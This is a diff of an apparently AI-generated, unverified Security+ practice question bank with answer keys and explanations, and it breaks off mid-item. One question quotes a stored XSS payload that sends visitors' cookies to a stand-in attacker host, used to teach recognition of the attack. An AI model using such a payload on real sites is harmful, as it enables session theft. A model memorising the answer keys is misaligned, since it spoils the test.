@@ -4,7 +4,12 @@
     "domain": "1.0",
     "objective": "1.1",
     "question": "A workstation locks an account after five failed logon attempts. Which control category and type is this?",
-    "choices": {"a": "Managerial, detective", "b": "Technical, preventive", "c": "Operational, corrective", "d": "Physical, deterrent"},
+    "choices": {
+      "a": "Managerial, detective",
+      "b": "Technical, preventive",
+      "c": "Operational, corrective",
+      "d": "Physical, deterrent"
+    },
     "answer": "b",
     "explanation": "Account lockout is enforced by the system itself (technical) and stops further guessing before access is gained (preventive). Managerial controls are policies and risk decisions, operational controls are carried out by people, and physical controls protect facilities.",
     "source": "ai-generated",
@@ -15,7 +20,12 @@
     "domain": "1.0",
     "objective": "1.2",
     "question": "Which security concept gives proof that a specific sender sent a message, so the sender cannot later deny it?",
-    "choices": {"a": "Confidentiality", "b": "Availability", "c": "Non-repudiation", "d": "Obfuscation"},
+    "choices": {
+      "a": "Confidentiality",
+      "b": "Availability",
+      "c": "Non-repudiation",
+      "d": "Obfuscation"
+    },
     "answer": "c",
     "explanation": "Non-repudiation, usually provided by digital signatures, proves who originated a message. Confidentiality keeps data secret, availability keeps systems usable, and obfuscation makes data harder to understand without protecting it cryptographically.",
     "source": "ai-generated",
@@ -26,9 +36,14 @@
     "domain": "1.0",
     "objective": "1.2",
     "question": "In a zero trust architecture, which component evaluates policy and decides whether a subject may access a resource?",
-    "choices": {"a": "Policy enforcement point", "b": "Policy engine", "c": "Implicit trust zone", "d": "Subject"},
+    "choices": {
+      "a": "Policy enforcement point",
+      "b": "Policy engine",
+      "c": "Implicit trust zone",
+      "d": "Subject"
+    },
     "answer": "b",
-    "explanation": "The policy engine (part of the control plane, with the policy administrator) makes the access decision. The policy enforcement point carries out that decision in the data plane. Zero trust removes implicit trust zones, and the subject is the user or device requesting access.",
+    "explanation": "The policy engine (part of the control plane, with the policy administrator) makes the access decision. The policy enforcement point carries out that decision in the data plane. An implicit trust zone is the area behind a PEP where entities are trusted once they pass it, not a decision-making component, and the subject is the user or device requesting access.",
     "source": "ai-generated",
     "verified": false
   },
@@ -37,7 +52,12 @@
     "domain": "1.0",
     "objective": "1.4",
     "question": "An administrator downloads an ISO and wants to confirm it was not altered. What should be compared with the value the vendor publishes?",
-    "choices": {"a": "An AES-256 ciphertext", "b": "A SHA-256 hash", "c": "An RSA public key", "d": "A Base64 encoding"},
+    "choices": {
+      "a": "An AES-256 ciphertext",
+      "b": "A SHA-256 hash",
+      "c": "An RSA public key",
+      "d": "A Base64 encoding"
+    },
     "answer": "b",
     "explanation": "Hashing provides integrity: if the computed SHA-256 hash matches the published one, the file is unchanged. AES provides confidentiality, an RSA public key on its own proves nothing about the file, and Base64 is encoding, not security.",
     "source": "ai-generated",
@@ -48,9 +68,14 @@
     "domain": "1.0",
     "objective": "1.4",
     "question": "Alice wants to send Bob a message that only Bob can read, using asymmetric encryption. Which key does Alice encrypt with?",
-    "choices": {"a": "Alice's private key", "b": "Alice's public key", "c": "Bob's public key", "d": "Bob's private key"},
+    "choices": {
+      "a": "Alice's private key",
+      "b": "Alice's public key",
+      "c": "Bob's public key",
+      "d": "Bob's private key"
+    },
     "answer": "c",
-    "explanation": "Encrypting with Bob's public key means only Bob's private key can decrypt it. Encrypting with Alice's private key creates a digital signature, which proves origin but provides no confidentiality. Alice never has Bob's private key.",
+    "explanation": "Encrypting with Bob's public key means only Bob's private key can decrypt it. Encrypting with Alice's private key creates a digital signature, which proves origin but provides no confidentiality, and encrypting with Alice's public key would let only Alice decrypt it. Alice never has Bob's private key.",
     "source": "ai-generated",
     "verified": false
   },
@@ -59,7 +84,12 @@
     "domain": "2.0",
     "objective": "2.4",
     "question": "Logs show one or two failed logins against hundreds of different accounts, all using the same common password. Which attack is this?",
-    "choices": {"a": "Brute force", "b": "Password spraying", "c": "Credential stuffing", "d": "Pass the hash"},
+    "choices": {
+      "a": "Brute force",
+      "b": "Password spraying",
+      "c": "Credential stuffing",
+      "d": "Pass the hash"
+    },
     "answer": "b",
     "explanation": "Password spraying tries a few common passwords across many accounts to stay under lockout thresholds. Brute force hammers one account with many passwords, credential stuffing replays username and password pairs from breaches, and pass the hash reuses captured NTLM hashes.",
     "source": "ai-generated",
@@ -67,10 +97,15 @@
   },
   {
     "id": "SY0-701-0007",
-    "domain": "2.0",
-    "objective": "2.5",
+    "domain": "4.0",
+    "objective": "4.5",
     "question": "A company wants receiving mail servers to quarantine messages that fail SPF and DKIM checks for its domain. Which DNS record sets that policy?",
-    "choices": {"a": "MX", "b": "DMARC", "c": "PTR", "d": "CNAME"},
+    "choices": {
+      "a": "MX",
+      "b": "DMARC",
+      "c": "PTR",
+      "d": "CNAME"
+    },
     "answer": "b",
     "explanation": "A DMARC TXT record at _dmarc.<domain> tells receivers what to do with mail that fails SPF and DKIM alignment (none, quarantine, or reject) and where to send reports. MX routes inbound mail, PTR is reverse DNS, and CNAME is an alias.",
     "source": "ai-generated",
@@ -81,7 +116,12 @@
     "domain": "4.0",
     "objective": "4.8",
     "question": "An analyst moves an infected laptop to a quarantine VLAN to stop it spreading. Which phase of the incident response process is this?",
-    "choices": {"a": "Preparation", "b": "Detection", "c": "Containment", "d": "Lessons learned"},
+    "choices": {
+      "a": "Preparation",
+      "b": "Detection",
+      "c": "Containment",
+      "d": "Lessons learned"
+    },
     "answer": "c",
     "explanation": "Isolating an affected system limits damage, which is containment. Preparation happens before incidents, detection identifies that an incident happened, and lessons learned comes after recovery.",
     "source": "ai-generated",
@@ -92,9 +132,14 @@
     "domain": "4.0",
     "objective": "4.8",
     "question": "Following the order of volatility, which evidence should be collected first from a running compromised system?",
-    "choices": {"a": "A full image of the hard drive", "b": "The contents of RAM", "c": "Archived backup tapes", "d": "Logs on a remote syslog server"},
+    "choices": {
+      "a": "A full image of the hard drive",
+      "b": "The contents of RAM",
+      "c": "Archived backup tapes",
+      "d": "Logs on a remote syslog server"
+    },
     "answer": "b",
-    "explanation": "Collect the most volatile data first. RAM is lost at power-off, so it comes before disk images. Remote logs and archived backups are the least volatile and can be collected later. This is why containment procedures say not to power off a suspect machine.",
+    "explanation": "Collect the most volatile data first. RAM is lost at power-off, so it is captured before the hard drive is imaged. Logs on a remote syslog server and archived backup tapes are far less volatile and can be collected later.",
     "source": "ai-generated",
     "verified": false
   },
@@ -103,8 +148,16 @@
     "domain": "4.0",
     "objective": "4.6",
     "question": "A login requires a password and a hardware security key. Which two authentication factor categories are used? (Choose two.)",
-    "choices": {"a": "Something you know", "b": "Something you have", "c": "Something you are", "d": "Somewhere you are"},
-    "answer": ["a", "b"],
+    "choices": {
+      "a": "Something you know",
+      "b": "Something you have",
+      "c": "Something you are",
+      "d": "Somewhere you are"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
     "explanation": "The password is something you know and the security key is something you have. Something you are is biometrics, and somewhere you are is location-based.",
     "source": "ai-generated",
     "verified": false
@@ -114,7 +167,12 @@
     "domain": "5.0",
     "objective": "5.2",
     "question": "Management reviews a risk, decides the remaining risk is within its risk appetite, and formally signs off without taking further action. Which risk response is this?",
-    "choices": {"a": "Transfer", "b": "Avoid", "c": "Accept", "d": "Mitigate"},
+    "choices": {
+      "a": "Transfer",
+      "b": "Avoid",
+      "c": "Accept",
+      "d": "Mitigate"
+    },
     "answer": "c",
     "explanation": "Accepting a risk means formally acknowledging it and choosing not to act further. Transfer shifts it to another party (for example through insurance), avoidance stops the risky activity, and mitigation adds controls to reduce it.",
     "source": "ai-generated",
@@ -125,9 +183,806 @@
     "domain": "5.0",
     "objective": "5.5",
     "question": "A customer asks a SaaS vendor for evidence that its security controls operated effectively over the past twelve months. Which report best meets this request?",
-    "choices": {"a": "SOC 2 Type I", "b": "SOC 2 Type II", "c": "A vulnerability scan report", "d": "The vendor's acceptable use policy"},
+    "choices": {
+      "a": "SOC 2 Type I",
+      "b": "SOC 2 Type II",
+      "c": "A vulnerability scan report",
+      "d": "The vendor's acceptable use policy"
+    },
     "answer": "b",
     "explanation": "A SOC 2 Type II report covers the operating effectiveness of controls over a period of time. Type I covers control design at a single point in time. A scan report and an acceptable use policy are not independent attestations.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0101",
+    "domain": "1.0",
+    "objective": "1.3",
+    "question": "A change advisory board is reviewing a request to upgrade the firmware on the core switches during Saturday's maintenance window. The request already includes test results and a list of affected stakeholders. Which element should the board require so the team can quickly return the switches to their previous working state if the upgrade fails?",
+    "choices": {
+      "a": "A backout plan",
+      "b": "An impact analysis",
+      "c": "A stakeholder sign-off",
+      "d": "A dependency list"
+    },
+    "answer": "a",
+    "explanation": "A backout plan documents the steps to reverse a change and restore the last known good state if something goes wrong. An impact analysis estimates what the change will affect but does not describe how to undo it. Stakeholder sign-off is approval, and a dependency list identifies related systems; neither provides rollback steps.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0102",
+    "domain": "1.0",
+    "objective": "1.4",
+    "question": "A browser needs to confirm that a web server's certificate has not been revoked. Instead of downloading the full list of revoked certificates, it sends a query about that one certificate to a responder run for the issuing CA. Which mechanism is the browser using?",
+    "choices": {
+      "a": "Certificate revocation list (CRL)",
+      "b": "Online Certificate Status Protocol (OCSP)",
+      "c": "Certificate signing request (CSR)",
+      "d": "Key escrow"
+    },
+    "answer": "b",
+    "explanation": "OCSP lets a client ask a responder for the real-time status (good, revoked, or unknown) of a single certificate. A CRL is the complete list of revoked serial numbers that the client must download and search. A CSR is what an entity submits to a CA to request a new certificate, and key escrow is storing a copy of keys with a trusted third party.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0103",
+    "domain": "2.0",
+    "objective": "2.1",
+    "question": "Shortly after a city council approves a controversial pipeline project, the city's public website is defaced with protest slogans, and the group responsible posts a manifesto explaining its cause. No data was stolen and no ransom was demanded. Which threat actor is MOST likely responsible?",
+    "choices": {
+      "a": "Organized crime",
+      "b": "Nation-state",
+      "c": "Hacktivist",
+      "d": "Shadow IT"
+    },
+    "answer": "c",
+    "explanation": "Hacktivists are motivated by political or philosophical beliefs and often use defacement to publicize a cause. Organized crime is driven by financial gain, such as ransom or data theft, and nation-states usually pursue espionage or strategic disruption rather than public protest. Shadow IT refers to employees using unapproved technology, not deliberate attacks.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0104",
+    "domain": "2.0",
+    "objective": "2.2",
+    "question": "The accounts payable team receives an email from a long-standing supplier's real email address asking that all future invoice payments go to a new bank account. An investigation later finds that an attacker had taken over the supplier's mailbox. Which attack does this BEST describe?",
+    "choices": {
+      "a": "Typosquatting",
+      "b": "Business email compromise",
+      "c": "Watering hole",
+      "d": "Vishing"
+    },
+    "answer": "b",
+    "explanation": "Business email compromise uses a compromised or impersonated business email account to trick staff into sending money or sensitive data, often by changing payment details. Typosquatting would rely on a look-alike domain, but this email came from the supplier's real account. A watering hole compromises a website the targets visit, and vishing is done over voice calls.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0105",
+    "domain": "2.0",
+    "objective": "2.2",
+    "question": "Attackers learn that engineers at a defense contractor often visit a small online forum for a specialized design tool. The attackers compromise the forum and plant an exploit that runs only for visitors coming from the contractor's IP address range. Which type of attack is this?",
+    "choices": {
+      "a": "Watering hole",
+      "b": "Typosquatting",
+      "c": "Pretexting",
+      "d": "Smishing"
+    },
+    "answer": "a",
+    "explanation": "A watering hole attack compromises a legitimate site that a target group is known to visit and waits for them to come to it. Typosquatting registers misspelled domains, while this attack used the real forum. Pretexting is a made-up story used to manipulate a victim, and smishing is phishing by text message.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0106",
+    "domain": "2.0",
+    "objective": "2.2",
+    "question": "An employee receives a text message that claims to be from the company's payroll provider, PayFlow. It warns that direct deposit will be suspended unless the employee signs in at payfl0w-support.com, which uses a zero in place of the letter o. Which TWO threat techniques are being used? (Choose two.)",
+    "choices": {
+      "a": "Smishing",
+      "b": "Typosquatting",
+      "c": "Vishing",
+      "d": "Watering hole"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "The lure arrives by SMS text message, which makes it smishing, and the link uses a deliberately misspelled look-alike domain, which is typosquatting. Vishing would use a voice call. A watering hole attack compromises a site the victims already visit rather than sending them a link to a fake one.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0107",
+    "domain": "2.0",
+    "objective": "2.3",
+    "question": "A developer finds that a saved product review on the company website contains <script>new Image().src='https://evil.example/c?='+document.cookie</script>. The code runs in the browser of every visitor who views the review. Which vulnerability is being exploited?",
+    "choices": {
+      "a": "SQL injection",
+      "b": "Directory traversal",
+      "c": "Cross-site scripting",
+      "d": "Buffer overflow"
+    },
+    "answer": "c",
+    "explanation": "Cross-site scripting (XSS) injects script into a web page so it runs in other users' browsers, here to steal their session cookies. SQL injection targets the database behind the application, not visitors' browsers. Directory traversal uses ../ sequences to reach files outside the web root, and a buffer overflow writes past the end of a memory buffer.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0108",
+    "domain": "2.0",
+    "objective": "2.3",
+    "question": "A privileged program first checks that the calling user is allowed to write to /tmp/report.txt, then a few milliseconds later opens the file and writes to it. An attacker replaces the file with a symbolic link to /etc/passwd in the gap between the check and the write. Which vulnerability is this?",
+    "choices": {
+      "a": "Buffer overflow",
+      "b": "Race condition",
+      "c": "Memory injection",
+      "d": "Directory traversal"
+    },
+    "answer": "b",
+    "explanation": "This is a time-of-check to time-of-use (TOCTOU) race condition: the resource changes between when it is checked and when it is used. A buffer overflow writes more data than a buffer can hold, and memory injection places malicious code into a running process's memory. Directory traversal manipulates a path with ../ sequences rather than swapping a file between two operations.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0109",
+    "domain": "2.0",
+    "objective": "2.4",
+    "question": "Two weeks after a database administrator was terminated, a scheduled script on the payroll server deleted several tables. The script had been written to run only when the administrator's account no longer appeared in the HR system. Which type of malicious code is this?",
+    "choices": {
+      "a": "Ransomware",
+      "b": "Worm",
+      "c": "Rootkit",
+      "d": "Logic bomb"
+    },
+    "answer": "d",
+    "explanation": "A logic bomb is code that stays dormant until a specific condition or date is met and then carries out its payload, here deleting data after the creator was removed from HR. Ransomware encrypts data and demands payment, and a worm spreads on its own across a network. A rootkit hides its presence and keeps privileged access rather than waiting for a trigger.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0110",
+    "domain": "2.0",
+    "objective": "2.4",
+    "question": "A SIEM shows that a user signed in to the VPN from Denver at 09:02 and logged off at 09:10. At 09:25 the same account signed in from an IP address in Singapore. Both sign-ins succeeded on the first attempt, and the sessions did not overlap. Which indicator does this activity represent?",
+    "choices": {
+      "a": "Concurrent session usage",
+      "b": "Impossible travel",
+      "c": "Account lockout",
+      "d": "Brute-force attempt"
+    },
+    "answer": "b",
+    "explanation": "Impossible travel means sign-ins from locations too far apart for the user to have physically traveled between them in the time shown, which suggests stolen credentials. Concurrent session usage requires sessions active at the same time, and these did not overlap. There were no failed attempts, so this does not indicate account lockout or a brute-force attack.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0111",
+    "domain": "2.0",
+    "objective": "2.4",
+    "question": "A company's web servers are being flooded with large DNS response packets they never requested. Analysis shows the attackers sent small DNS queries to thousands of open resolvers, using the company's IP address as the spoofed source. Which attack is occurring?",
+    "choices": {
+      "a": "DNS cache poisoning",
+      "b": "On-path attack",
+      "c": "Amplified DDoS attack",
+      "d": "Domain hijacking"
+    },
+    "answer": "c",
+    "explanation": "In an amplified (reflected) DDoS attack, small spoofed requests make third-party servers send much larger responses to the victim, multiplying the attack traffic. DNS cache poisoning inserts false records into a resolver to redirect users, and it does not flood a target. An on-path attack intercepts traffic between two parties, and domain hijacking takes control of a domain's registration.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0112",
+    "domain": "2.0",
+    "objective": "2.5",
+    "question": "A user reports that files on their workstation now have an unfamiliar extension and that a text file demands payment in cryptocurrency. The EDR console shows the workstation trying to connect to file shares across the network. What should the analyst do FIRST?",
+    "choices": {
+      "a": "Restore the user's files from the most recent backup",
+      "b": "Isolate the workstation from the network",
+      "c": "Reimage the workstation with the standard build",
+      "d": "Run a vulnerability scan against the file servers"
+    },
+    "answer": "b",
+    "explanation": "These are signs of ransomware, and the first priority is to isolate the infected host so it cannot encrypt more systems over the network. Restoring files while the malware is still active does not stop the spread and the restored files could be encrypted again, and reimaging destroys evidence and belongs after containment. A vulnerability scan does nothing to stop the active spread.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0113",
+    "domain": "2.0",
+    "objective": "2.5",
+    "question": "A hospital has several lobby kiosks that should run only its patient check-in application. Which mitigation would MOST effectively prevent any other executable, including previously unknown malware, from running on the kiosks?",
+    "choices": {
+      "a": "Application deny list",
+      "b": "Signature-based antivirus",
+      "c": "Host-based intrusion detection system",
+      "d": "Application allow list"
+    },
+    "answer": "d",
+    "explanation": "An application allow list permits only approved executables to run and blocks everything else, including new malware that has no signature. A deny list and signature-based antivirus block only software already known to be bad. A HIDS detects and alerts on suspicious activity but is not designed to prevent programs from running.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0114",
+    "domain": "3.0",
+    "objective": "3.1",
+    "question": "A company runs its application on virtual machines from an infrastructure as a service (IaaS) provider. Under the shared responsibility model, which TWO tasks are the customer's responsibility? (Choose two.)",
+    "choices": {
+      "a": "Patching the guest operating systems on the virtual machines",
+      "b": "Configuring the security group rules that control traffic to the virtual machines",
+      "c": "Providing physical security for the provider's data centers",
+      "d": "Patching the hypervisor that hosts the virtual machines"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "In IaaS, the customer manages everything from the guest operating system up, including OS patching and network access rules such as security groups. The provider is responsible for the physical facilities and the virtualization layer, including the hypervisor.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0115",
+    "domain": "3.0",
+    "objective": "3.1",
+    "question": "A water utility's SCADA system uses controllers that cannot be patched without the vendor recertifying the whole system. The utility wants to make sure there is no network path at all between the SCADA network and the corporate network or the internet. Which architecture meets this requirement?",
+    "choices": {
+      "a": "Placing the SCADA devices on a separate VLAN",
+      "b": "An air-gapped network",
+      "c": "A site-to-site VPN between the plant and headquarters",
+      "d": "Network address translation on the plant router"
+    },
+    "answer": "b",
+    "explanation": "An air gap physically separates the SCADA network so it has no connection to other networks, which protects systems that cannot be patched. A VLAN is logical segmentation on shared hardware, so a routed path can still exist. A VPN deliberately connects networks, and NAT only translates addresses without removing the connection.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0116",
+    "domain": "3.0",
+    "objective": "3.2",
+    "question": "A firewall protects a data center that stores regulated financial records. Policy states that if the firewall fails, no traffic may pass through it, even if this causes an outage. How should the firewall be configured?",
+    "choices": {
+      "a": "Fail-open",
+      "b": "Fail-closed",
+      "c": "Passive monitoring mode",
+      "d": "Connected through a network tap"
+    },
+    "answer": "b",
+    "explanation": "A fail-closed device blocks all traffic when it fails, putting security ahead of availability as the policy requires. Fail-open would let traffic through unfiltered during a failure, favoring availability. Passive monitoring and a tap connection only observe copies of traffic and cannot block anything.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0117",
+    "domain": "3.0",
+    "objective": "3.2",
+    "question": "A security team connects a new intrusion sensor to the network through a passive network tap rather than placing it inline. Which TWO statements describe this deployment? (Choose two.)",
+    "choices": {
+      "a": "The sensor cannot block malicious packets before they reach their destination",
+      "b": "A failure of the sensor will not interrupt production traffic",
+      "c": "Every packet passes through the sensor and gains added latency",
+      "d": "The sensor can drop traffic that matches an attack signature in real time"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "A sensor on a tap receives a copy of the traffic, so it can detect and alert but cannot stop packets, and if it fails the production traffic keeps flowing. Added latency and the ability to drop packets in real time are traits of an inline device such as an IPS, which sits directly in the traffic path.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0118",
+    "domain": "3.0",
+    "objective": "3.2",
+    "question": "A company wants to protect its public e-commerce site from SQL injection and cross-site scripting using a device purpose-built to inspect HTTP requests and responses with rules specific to web applications. Which device should it deploy?",
+    "choices": {
+      "a": "Next-generation firewall",
+      "b": "Web application firewall",
+      "c": "Layer 4 stateful firewall",
+      "d": "VPN concentrator"
+    },
+    "answer": "b",
+    "explanation": "A web application firewall (WAF) is designed specifically to inspect HTTP and HTTPS traffic to a web application and block attacks such as SQL injection and XSS. A next-generation firewall adds application awareness and IPS across many protocols, but it is a general network firewall rather than one built for a single web application. A layer 4 firewall sees only addresses, ports, and connection state, and a VPN concentrator terminates encrypted tunnels.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0119",
+    "domain": "3.0",
+    "objective": "3.3",
+    "question": "An analytics server decrypts customer records and loads them into RAM so a report can be calculated. Memory-scraping malware on the server could read the records at this point. Which data state is at risk?",
+    "choices": {
+      "a": "Data at rest",
+      "b": "Data in transit",
+      "c": "Data in use",
+      "d": "Archived data"
+    },
+    "answer": "c",
+    "explanation": "Data in use is data being actively processed in memory or by the CPU, and it is often unencrypted at that moment. Data at rest is stored on disk or other media, and data in transit is moving across a network. Archived data is a form of stored data, not data being processed.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0120",
+    "domain": "3.0",
+    "objective": "3.3",
+    "question": "A retailer wants to replace credit card numbers in its order database with random values that have no mathematical relationship to the original numbers. The real card numbers are kept in a separate secure vault, and authorized payment systems can look them up when needed. Which technique is this?",
+    "choices": {
+      "a": "Data masking",
+      "b": "Hashing",
+      "c": "Tokenization",
+      "d": "Symmetric encryption"
+    },
+    "answer": "c",
+    "explanation": "Tokenization swaps sensitive data for a random token and stores the mapping in a protected vault, so the original value can be retrieved only through that vault. Masking hides part of the value, such as showing only the last four digits, and hashing is one-way, so the original cannot be recovered. Encrypted data is mathematically derived from the original and can be reversed with the key.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0121",
+    "domain": "3.0",
+    "objective": "3.3",
+    "question": "A multinational company's legal team advises that customer data stored in a given country is subject to that country's laws, so EU customer records should be kept in cloud regions located in the EU. Which concept is the legal team describing?",
+    "choices": {
+      "a": "Data classification",
+      "b": "Data sovereignty",
+      "c": "Data retention",
+      "d": "Data masking"
+    },
+    "answer": "b",
+    "explanation": "Data sovereignty is the principle that data is subject to the laws of the country where it is stored or collected, which drives decisions about where data can be hosted. Data classification labels data by sensitivity, and data retention defines how long data is kept. Data masking hides parts of data values and has nothing to do with legal jurisdiction.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0122",
+    "domain": "3.0",
+    "objective": "3.4",
+    "question": "A company needs a recovery site that it can bring online within a day or two after a disaster. The site must already have power, network connectivity, and servers, but the budget does not allow live data replication, so data will be restored from backups. Which type of site meets these needs?",
+    "choices": {
+      "a": "Hot site",
+      "b": "Cold site",
+      "c": "Warm site",
+      "d": "Active-active data center"
+    },
+    "answer": "c",
+    "explanation": "A warm site has facilities and hardware ready but needs current data restored before it can take over, so recovery takes hours to days at moderate cost. A hot site keeps up-to-date data and can take over almost immediately, which costs more. A cold site has space and power but no ready equipment, and an active-active data center runs production at both locations at all times.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0123",
+    "domain": "3.0",
+    "objective": "3.4",
+    "question": "Which resilience technique records each change to a database or file system in a log so the system can be brought back to a consistent state, or have changes replayed up to the point of failure, after a crash?",
+    "choices": {
+      "a": "Snapshot",
+      "b": "Replication",
+      "c": "Load balancing",
+      "d": "Journaling"
+    },
+    "answer": "d",
+    "explanation": "Journaling writes changes to a log before or as they are applied, so incomplete transactions can be rolled back or committed ones replayed after a failure. A snapshot captures the state at a single point in time and does not record each later change. Replication copies data to another system, and load balancing spreads requests across servers.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0124",
+    "domain": "3.0",
+    "objective": "3.4",
+    "question": "A data center must keep running without interruption through a utility power outage that could last several hours. Which TWO components together provide power both at the instant the outage begins and for its full duration? (Choose two.)",
+    "choices": {
+      "a": "Uninterruptible power supply (UPS)",
+      "b": "Generator",
+      "c": "Managed power distribution unit (PDU)",
+      "d": "Dual power supplies in each server"
+    },
+    "answer": [
+      "a",
+      "b"
+    ],
+    "explanation": "A UPS supplies battery power the instant utility power drops and bridges the short gap while the generator starts, and the generator then supplies power for an extended outage. A managed PDU only distributes and monitors power that it receives. Dual power supplies protect against a failed power supply unit, not against losing utility power.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0201",
+    "domain": "4.0",
+    "objective": "4.1",
+    "question": "A company buys smartphones for its sales staff, enrolls them in MDM, and allows employees to install personal apps and use the phones outside of work. Which deployment model is the company using?",
+    "choices": {
+      "a": "BYOD",
+      "b": "COPE",
+      "c": "CYOD",
+      "d": "VDI"
+    },
+    "answer": "b",
+    "explanation": "Corporate-owned, personally enabled (COPE) means the organization owns and manages the device but permits personal use. BYOD means the employee owns the device, and CYOD means employees choose a device from an approved list, but nothing in the scenario says the staff chose their phones. VDI is a desktop virtualization approach, not a mobile device ownership model.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0202",
+    "domain": "4.0",
+    "objective": "4.1",
+    "question": "A network team is replacing a shared Wi-Fi passphrase with WPA3-Enterprise so that each employee authenticates with individual credentials through 802.1X. To which type of server will the access points forward the authentication requests?",
+    "choices": {
+      "a": "TACACS+",
+      "b": "RADIUS",
+      "c": "NTP",
+      "d": "Syslog"
+    },
+    "answer": "b",
+    "explanation": "In WPA2/WPA3-Enterprise, the access point acts as the 802.1X authenticator and relays EAP traffic to a RADIUS server, which checks the user's credentials. TACACS+ is mainly used for administering network devices, not for wireless client authentication. NTP synchronizes time and syslog collects log messages; neither authenticates users.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0203",
+    "domain": "4.0",
+    "objective": "4.1",
+    "question": "A developer adds JavaScript to a web form that rejects apostrophes and semicolons before the form is submitted. A penetration tester still succeeds with SQL injection by sending requests directly with a proxy tool. Which control would best address this weakness?",
+    "choices": {
+      "a": "Setting the Secure attribute on session cookies",
+      "b": "Signing the application code with a trusted certificate",
+      "c": "Performing input validation on the server side",
+      "d": "Obfuscating the client-side JavaScript"
+    },
+    "answer": "c",
+    "explanation": "Client-side checks can be bypassed by anyone who sends requests directly, so input must be validated on the server, ideally along with parameterized queries. The Secure cookie attribute only keeps cookies off unencrypted connections. Code signing proves who published the code, and obfuscating JavaScript does not stop an attacker from skipping it entirely.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0204",
+    "domain": "4.0",
+    "objective": "4.2",
+    "question": "An organization plans to donate retired laptops to a local school and needs to remove company data while leaving the drives usable. Which methods meet this requirement? (Choose two.)",
+    "choices": {
+      "a": "Degaussing the hard drives",
+      "b": "Shredding the drives",
+      "c": "Performing a cryptographic erase on self-encrypting drives",
+      "d": "Overwriting the drives with a secure wipe utility"
+    },
+    "answer": [
+      "c",
+      "d"
+    ],
+    "explanation": "Cryptographic erase destroys the encryption key so the data is unrecoverable, and overwriting replaces the data; both are sanitization methods that leave the drive reusable. Degaussing a hard drive also wipes the servo information the drive needs to operate, making it unusable. Shredding is physical destruction, so nothing remains to donate.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0205",
+    "domain": "4.0",
+    "objective": "4.3",
+    "question": "A vulnerability scan flags a Linux web server as vulnerable to a critical CVE based on the Apache version string. The administrator confirms that the distribution vendor backported the security fix into the installed package without changing the version number. How should this finding be classified?",
+    "choices": {
+      "a": "False positive",
+      "b": "False negative",
+      "c": "True positive",
+      "d": "True negative"
+    },
+    "answer": "a",
+    "explanation": "The scanner reported a vulnerability that is not actually present, which is a false positive, often caused by version-based detection on backported packages. A false negative is a real vulnerability the scanner missed. A true positive would mean the flaw really exists, and a true negative would mean nothing was reported because nothing was there.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0206",
+    "domain": "4.0",
+    "objective": "4.3",
+    "question": "A manufacturing controller has a vulnerability with a high CVSS score, but the vendor no longer releases patches for it. Until the controller can be replaced, the security team moves it to an isolated network segment and allows only one engineering workstation to reach it. Which term best describes this action?",
+    "choices": {
+      "a": "Risk transfer",
+      "b": "Compensating control",
+      "c": "Deterrent control",
+      "d": "Vulnerability exception with no further action"
+    },
+    "answer": "b",
+    "explanation": "A compensating control is an alternative safeguard used when the primary fix, here a patch, cannot be applied, and segmentation reduces the exposure. Risk transfer shifts the financial impact to another party, such as an insurer. A deterrent control discourages attackers but does not limit access, and the team clearly took further action rather than simply documenting an exception.",
+    "source": "ai-generated",
+    "verified": false
+  },
+  {
+    "id": "SY0-701-0207",
+    "domain": "4.0",
+    "objective": "4.4",
+    "question": "SOC analysts report that a SIEM rule for failed logins generates hundreds of alerts a day, and nearly all are caused by a backup service account with an expired password that is already scheduled to be fixed. Analysts have started ignoring the alert entirely. What should the team do?",
+    "choices": {
+      "a": "Disable log collection from the affected server",
+      "b": "Tune the alert rule to reduce noise while still detecting real attacks",
+      "c": "Increase the SIEM's log retention period",
+      "d": "Archive the alerts to cold storage"
+    },
+    "answer": "b",
